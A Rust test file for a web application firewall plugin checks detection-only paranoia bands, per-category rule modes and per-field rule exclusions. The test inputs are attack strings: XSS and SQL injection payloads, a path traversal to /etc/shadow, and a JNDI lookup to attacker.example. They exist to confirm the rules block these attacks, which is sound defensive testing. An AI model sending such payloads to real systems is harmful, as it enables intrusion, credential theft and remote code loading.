//! Enterprise tuning controls for the WAF rule pack.
//!
//! * `detection_paranoia_level` — rules above `paranoia_level` but within the
//!   detection level compile as detection-only: they are reported through
//!   `waf.detection_rule_hits`, never block, never score, and never make a
//!   body policy "enforcing", so an operator can measure what a higher
//!   paranoia level would flag before switching to it.
//! * `category_modes` — a bulk action per built-in rule category, between
//!   `default_rule_action` and the per-rule controls in precedence.

use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext};
use serde_json::{Value, json};

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

fn waf(mut config: Value) -> Result<Waf, String> {
    if let Some(object) = config.as_object_mut()
        && !object.contains_key("scan_budget_ms")
    {
        object.insert("scan_budget_ms".to_string(), json!(0));
    }
    Waf::new(&config)
}

fn meta<'a>(ctx: &'a RequestContext, key: &str) -> Option<&'a str> {
    ctx.metadata.get(key).map(String::as_str)
}

fn listed(ctx: &RequestContext, key: &str, rule_id: &str) -> bool {
    meta(ctx, key).is_some_and(|ids| ids.split(',').any(|id| id == rule_id))
}

async fn query(plugin: &Waf, raw_query: &str) -> (PluginResult, RequestContext) {
    let mut request = ctx("GET", "/search");
    request.set_raw_query_string(raw_query.into());
    let result = plugin.authorize(&mut request).await;
    (result, request)
}

async fn json_body(plugin: &Waf, body: &[u8]) -> (PluginResult, RequestContext) {
    let mut request = ctx("POST", "/submit");
    request
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = request.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut request, &headers, body)
        .await;
    (result, request)
}

/// `FE-RFI-001` (any remote URL in a query value) is a level-2 rule.
const LEVEL_TWO_ONLY_QUERY: &str = "next=https://partner.example.com/landing";
/// `FE-XSS-001` is a level-1 rule.
const LEVEL_ONE_QUERY: &str = "q=%3Cscript%3Ealert(1)";

fn recommended_with_detection_band() -> Waf {
    waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1,
        "detection_paranoia_level": 2
    }))
    .unwrap()
}

#[tokio::test]
async fn detection_band_reports_without_blocking_or_touching_blocking_metadata() {
    let plugin = recommended_with_detection_band();
    let (result, request) = query(&plugin, LEVEL_TWO_ONLY_QUERY).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.detection_rule_hits", "FE-RFI-001"));
    assert_eq!(meta(&request, "waf.detection_paranoia"), Some("2"));
    // The blocking posture found nothing, and says so.
    assert_eq!(meta(&request, "waf.action"), Some("clean"));
    assert_eq!(meta(&request, "waf.rule_hits"), None);
    assert_eq!(meta(&request, "waf.severity"), None);
    assert_eq!(meta(&request, "waf.block_reason"), None);

    // Without the band the same rule is compiled out at level 1...
    let level_one = waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1
    }))
    .unwrap();
    let (result, request) = query(&level_one, LEVEL_TWO_ONLY_QUERY).await;
    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(meta(&request, "waf.detection_rule_hits"), None);

    // ...and enforced once `paranoia_level` itself is raised.
    let level_two = waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 2
    }))
    .unwrap();
    let (result, request) = query(&level_two, LEVEL_TWO_ONLY_QUERY).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-RFI-001"));
}

#[tokio::test]
async fn detection_hits_are_reported_beside_a_blocking_hit_without_merging() {
    let plugin = recommended_with_detection_band();
    let (result, request) = query(
        &plugin,
        &format!("{LEVEL_ONE_QUERY}&{LEVEL_TWO_ONLY_QUERY}"),
    )
    .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-001"));
    assert!(!listed(&request, "waf.rule_hits", "FE-RFI-001"));
    assert!(listed(&request, "waf.detection_rule_hits", "FE-RFI-001"));
    assert_eq!(
        meta(&request, "waf.first_blocking_rule"),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn detection_hits_never_contribute_to_the_anomaly_score() {
    let plugin = waf(json!({
        "mode": "enforce",
        "paranoia_level": 1,
        "detection_paranoia_level": 2,
        "scoring": { "enabled": true, "block_threshold": 1 }
    }))
    .unwrap();

    let (result, request) = query(&plugin, LEVEL_TWO_ONLY_QUERY).await;
    assert!(
        matches!(result, PluginResult::Continue),
        "a detection-only hit must not cross even a threshold of 1"
    );
    assert!(listed(&request, "waf.detection_rule_hits", "FE-RFI-001"));
    assert_eq!(meta(&request, "waf.score"), None);

    // A level-1 hit still scores and blocks under the same instance.
    let (result, request) = query(&plugin, LEVEL_ONE_QUERY).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(meta(&request, "waf.block_reason"), Some("score"));
}

#[tokio::test]
async fn detection_band_covers_request_bodies() {
    let plugin = recommended_with_detection_band();
    // `FE-SQLI-004-B` (any SQL comment token in a body) is level 2.
    let (result, request) = json_body(&plugin, br#"{"note":"see -- above /* x */"}"#).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.detection_rule_hits", "FE-SQLI-004-B"));
    assert_eq!(meta(&request, "waf.rule_hits"), None);
}

#[tokio::test]
async fn explicit_rule_modes_enforce_still_promotes_a_band_rule_to_blocking() {
    let plugin = waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1,
        "detection_paranoia_level": 2,
        "rule_modes": { "FE-RFI-001": "enforce" }
    }))
    .unwrap();
    let (result, request) = query(&plugin, LEVEL_TWO_ONLY_QUERY).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-RFI-001"));
    assert_eq!(meta(&request, "waf.detection_rule_hits"), None);
}

#[tokio::test]
async fn a_detection_only_rule_is_never_an_enforcement_path() {
    // The only rule sits in the detection band, so `mode: enforce` has nothing
    // that can block and admission refuses it — even though the rule's own
    // action is `enforce`.
    let config = json!({
        "mode": "enforce",
        "include_default_rules": false,
        "paranoia_level": 1,
        "detection_paranoia_level": 2,
        "custom_rules": [{
            "id": "BAND-ONLY",
            "category": "custom",
            "target": "body_text",
            "match_kind": "contains",
            "pattern": "needle",
            "action": "enforce",
            "paranoia_min": 2
        }]
    });
    let error = waf(config.clone()).unwrap_err();
    assert!(error.contains("no enabled enforcement path"), "{error}");

    // Scoring does not rescue it either: detection-only rules score zero.
    let mut scored = config;
    scored["scoring"] = json!({ "enabled": true, "block_threshold": 1 });
    let error = waf(scored).unwrap_err();
    assert!(error.contains("no enabled enforcement path"), "{error}");
}

#[tokio::test]
async fn detection_only_body_rules_never_make_an_oversize_body_fail_closed() {
    // `on_body_too_large: fail_closed` rejects only when an enforcing body
    // policy applies, and with anomaly scoring on, ANY applicable body rule
    // counts. The only body rule here is in the detection band, so an
    // oversize body is prefix-scanned rather than refused; the query rule
    // exists only to give `mode: enforce` a reachable enforcement path.
    let plugin = waf(json!({
        "mode": "enforce",
        "include_default_rules": false,
        "paranoia_level": 1,
        "detection_paranoia_level": 3,
        "max_scan_bytes": 16,
        "scoring": { "enabled": true, "block_threshold": 100 },
        "custom_rules": [
            {
                "id": "BAND-BODY",
                "category": "custom",
                "target": "body_text",
                "match_kind": "contains",
                "pattern": "needle",
                "paranoia_min": 3
            },
            {
                "id": "QUERY-GATE",
                "category": "custom",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "gate-marker"
            }
        ]
    }))
    .unwrap();
    let (result, request) = json_body(&plugin, b"{\"a\":\"needle and a long tail\"}").await;
    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(meta(&request, "waf.scan_truncated"), Some("true"));
    assert_eq!(meta(&request, "waf.body_too_large"), Some("true"));
    assert!(listed(&request, "waf.detection_rule_hits", "BAND-BODY"));
    assert_eq!(meta(&request, "waf.block_reason"), None);
}

#[test]
fn detection_paranoia_level_is_validated() {
    let below = waf(json!({
        "mode": "monitor",
        "paranoia_level": 3,
        "detection_paranoia_level": 2
    }))
    .unwrap_err();
    assert!(
        below.contains(
            "`detection_paranoia_level` must be greater than or equal to `paranoia_level`"
        ),
        "{below}"
    );

    for invalid in [0, 5] {
        let error =
            waf(json!({ "mode": "monitor", "detection_paranoia_level": invalid })).unwrap_err();
        assert!(
            error.contains("`detection_paranoia_level` must be from 1 to 4"),
            "{error}"
        );
    }

    // Omitted: no band, identical to setting it equal to `paranoia_level`.
    assert!(waf(json!({ "mode": "monitor", "paranoia_level": 2 })).is_ok());
}

#[tokio::test]
async fn category_modes_enforce_one_category_and_leave_others_monitored() {
    let plugin = waf(json!({
        "mode": "enforce",
        "category_modes": { "xss": "enforce" }
    }))
    .unwrap();

    let (result, request) = query(&plugin, LEVEL_ONE_QUERY).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-001"));

    let (result, request) = query(&plugin, "id=1%20union%20select%20password").await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.rule_hits", "FE-SQLI-001"));
    assert_eq!(meta(&request, "waf.action"), Some("monitored"));
}

#[tokio::test]
async fn category_modes_sit_between_bulk_and_per_rule_controls() {
    let plugin = waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "category_modes": { "sqli": "disabled", "xss": "monitor" },
        "rule_modes": { "FE-XSS-002": "enforce" }
    }))
    .unwrap();

    // Category beats the bulk default: SQLi rules are gone entirely...
    let (result, request) = query(&plugin, "id=1%20union%20select%20password").await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!listed(&request, "waf.rule_hits", "FE-SQLI-001"));

    // ...XSS is monitored...
    let (result, request) = query(&plugin, LEVEL_ONE_QUERY).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-001"));

    // ...and an explicit per-rule mode beats the category.
    let (result, _) = query(&plugin, "next=javascript:alert(1)").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn naming_an_opt_in_category_explicitly_promotes_it() {
    // Encoding heuristics stay monitor under bulk `default_rule_action:
    // enforce`; naming their category is an explicit opt-in.
    let bulk_only = waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce"
    }))
    .unwrap();
    let (result, request) = query(&bulk_only, "code=SAVE50%2525").await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.rule_hits", "FE-ENCODING-001"));

    let promoted = waf(json!({
        "mode": "enforce",
        "category_modes": { "encoding_evasion": "enforce" }
    }))
    .unwrap();
    let (result, _) = query(&promoted, "code=SAVE50%2525").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn category_modes_do_not_retune_custom_rules() {
    let plugin = waf(json!({
        "mode": "enforce",
        "category_modes": { "xss": "enforce" },
        "custom_rules": [{
            "id": "ACME-XSS",
            "category": "xss",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "acme-marker",
            "action": "monitor"
        }]
    }))
    .unwrap();
    let (result, request) = query(&plugin, "q=acme-marker").await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(listed(&request, "waf.rule_hits", "ACME-XSS"));
}

#[test]
fn unknown_categories_and_values_are_refused() {
    let error = waf(json!({
        "mode": "monitor",
        "category_modes": { "xss": "enforce", "sqlinjection": "enforce" }
    }))
    .unwrap_err();
    assert!(error.contains("unknown built-in rule category"), "{error}");
    assert!(error.contains("sqlinjection"), "{error}");
    assert!(!error.contains("\"xss"), "{error}");

    let error = waf(json!({
        "mode": "monitor",
        "category_modes": { "xss": "loud" }
    }))
    .unwrap_err();
    assert!(error.contains("category_modes"), "{error}");

    let error = waf(json!({ "mode": "monitor", "category_modes": ["xss"] })).unwrap_err();
    assert!(
        error.contains("`category_modes` must be an object"),
        "{error}"
    );
}

// ---------------------------------------------------------------------------
// Field exclusions: `rule_overrides.<id>.exclude`.
// ---------------------------------------------------------------------------

fn recommended_with_overrides(overrides: Value) -> Waf {
    waf(json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1,
        "rule_overrides": overrides
    }))
    .unwrap()
}

async fn with_header(plugin: &Waf, name: &str, value: &str) -> (PluginResult, RequestContext) {
    let mut request = ctx("GET", "/");
    request.headers.insert(name.into(), value.into());
    let result = plugin.authorize(&mut request).await;
    (result, request)
}

#[tokio::test]
async fn excluded_query_parameter_is_skipped_by_that_rule_only() {
    let plugin = recommended_with_overrides(json!({
        "FE-XSS-001": { "exclude": { "query_params": ["html"] } }
    }));

    // The CMS field that legitimately carries markup no longer trips it...
    let (result, request) = query(&plugin, "html=%3Cscript%3Ewidget()%3C/script%3E").await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );
    assert!(!listed(&request, "waf.rule_hits", "FE-XSS-001"));

    // ...an encoded spelling of the same name is the same parameter...
    let (result, _) = query(&plugin, "%68tml=%3Cscript%3E").await;
    assert!(matches!(result, PluginResult::Continue));

    // ...every other parameter is still inspected by that rule...
    let (result, request) = query(&plugin, "html=ok&q=%3Cscript%3E").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-001"));

    // ...and every other rule still inspects the excluded parameter.
    let (result, request) = query(&plugin, "html=javascript:alert(1)").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-002"));
}

#[tokio::test]
async fn whole_url_rules_recheck_the_url_without_excluded_pairs() {
    // FE-PATHTRAV-001 scans the whole URL, which cannot attribute a match to
    // one pair; with an exclusion it re-runs over the URL minus that pair.
    let plugin = recommended_with_overrides(json!({
        "FE-PATHTRAV-001": { "exclude": { "query_params": ["relpath"] } }
    }));

    let (result, request) = query(&plugin, "relpath=../assets/logo.svg").await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );
    assert!(!listed(&request, "waf.rule_hits", "FE-PATHTRAV-001"));

    let (result, request) = query(&plugin, "relpath=../assets&file=../../etc/shadow").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-PATHTRAV-001"));
}

#[tokio::test]
async fn parameter_pollution_ignores_an_excluded_repeated_parameter() {
    let strict = recommended_with_overrides(json!({}));
    let (result, _) = query(&strict, "ids=1&ids=2").await;
    assert!(
        matches!(result, PluginResult::Reject { .. }),
        "baseline: HPP enforces"
    );

    let plugin = recommended_with_overrides(json!({
        "FE-HPP-001": { "exclude": { "query_params": ["ids"] } }
    }));
    let (result, request) = query(&plugin, "ids=1&ids=2&ids=3").await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );

    let (result, request) = query(&plugin, "ids=1&ids=2&role=user&role=admin").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-HPP-001"));
}

#[tokio::test]
async fn excluded_headers_match_case_insensitively() {
    let plugin = recommended_with_overrides(json!({
        "FE-JNDI-001-H": { "exclude": { "headers": ["X-Template-Preview"] } }
    }));
    let payload = "${jndi:ldap://attacker.example/a}";

    let (result, request) = with_header(&plugin, "x-template-preview", payload).await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );

    let (result, request) = with_header(&plugin, "user-agent", payload).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-JNDI-001-H"));
}

#[tokio::test]
async fn excluded_cookies_are_skipped_by_name() {
    let plugin = waf(json!({
        "mode": "enforce",
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CK-MARKER",
            "category": "custom",
            "target": "cookies",
            "match_kind": "contains",
            "pattern": "blocked-marker",
            "action": "enforce"
        }],
        "rule_overrides": {
            "CK-MARKER": { "exclude": { "cookies": ["prefs"] } }
        }
    }))
    .unwrap();

    let (result, _) = with_header(&plugin, "cookie", "prefs=blocked-marker; theme=dark").await;
    assert!(matches!(result, PluginResult::Continue));

    let (result, request) =
        with_header(&plugin, "cookie", "prefs=ok; session=blocked-marker").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "CK-MARKER"));
}

fn cookie_marker_waf(overrides: Value) -> Waf {
    waf(json!({
        "mode": "enforce",
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CK-MARKER",
            "category": "custom",
            "target": "cookies",
            "match_kind": "contains",
            "pattern": "blocked-marker",
            "action": "enforce"
        }],
        "rule_overrides": overrides
    }))
    .unwrap()
}

#[tokio::test]
async fn a_cookie_exclusion_covers_the_decoded_views_of_that_cookie() {
    // The raw crumb holds `blocked%2Dmarker`, so only its percent-decoded view
    // contains the pattern.
    let strict = cookie_marker_waf(json!({}));
    let (result, request) = with_header(&strict, "cookie", "prefs=blocked%2Dmarker").await;
    assert!(
        matches!(result, PluginResult::Reject { .. }),
        "baseline: the decoded view matches"
    );
    assert!(listed(&request, "waf.rule_hits", "CK-MARKER"));

    let plugin = cookie_marker_waf(json!({
        "CK-MARKER": { "exclude": { "cookies": ["prefs"] } }
    }));
    let (result, request) = with_header(&plugin, "cookie", "prefs=blocked%2Dmarker").await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );

    // The name comes from the raw crumb, never from a decoded view: the
    // decoded `prefs==blocked-marker` must not borrow the `prefs` exclusion
    // for a crumb whose raw name is `prefs%3D`.
    let (result, request) = with_header(&plugin, "cookie", "prefs%3D=blocked%2Dmarker").await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "CK-MARKER"));
}

#[tokio::test]
async fn materialized_query_names_are_compared_as_stored() {
    // Without a raw query string the scan reads the parsed map, whose keys are
    // already decoded.
    let plugin = recommended_with_overrides(json!({
        "FE-XSS-001": { "exclude": { "query_params": ["html"] } }
    }));

    let mut request = ctx("GET", "/search");
    request
        .query_params
        .insert("html".into(), "<script>widget()</script>".into());
    let result = plugin.authorize(&mut request).await;
    assert!(
        matches!(result, PluginResult::Continue),
        "{:?}",
        meta(&request, "waf.rule_hits")
    );

    // A stored `%68tml` is not decoded a second time into `html`.
    let mut request = ctx("GET", "/search");
    request
        .query_params
        .insert("%68tml".into(), "<script>".into());
    let result = plugin.authorize(&mut request).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(listed(&request, "waf.rule_hits", "FE-XSS-001"));
}

#[test]
fn exclusions_are_validated_against_the_rule_target() {
    let wrong_kind = waf(json!({
        "mode": "monitor",
        "rule_overrides": { "FE-XSS-001": { "exclude": { "cookies": ["prefs"] } } }
    }))
    .unwrap_err();
    assert!(
        wrong_kind.contains("has no cookies to exclude"),
        "{wrong_kind}"
    );

    let body_rule = waf(json!({
        "mode": "monitor",
        "rule_overrides": { "FE-XSS-001-B": { "exclude": { "query_params": ["q"] } } }
    }))
    .unwrap_err();
    assert!(
        body_rule.contains("has no query_params to exclude"),
        "{body_rule}"
    );

    let empty = waf(json!({
        "mode": "monitor",
        "rule_overrides": { "FE-XSS-001": { "exclude": {} } }
    }))
    .unwrap_err();
    assert!(empty.contains("must name at least one"), "{empty}");

    let typo = waf(json!({
        "mode": "monitor",
        "rule_overrides": { "FE-XSS-001": { "exclude": { "query_param": ["q"] } } }
    }))
    .unwrap_err();
    assert!(typo.contains("query_param"), "{typo}");
}
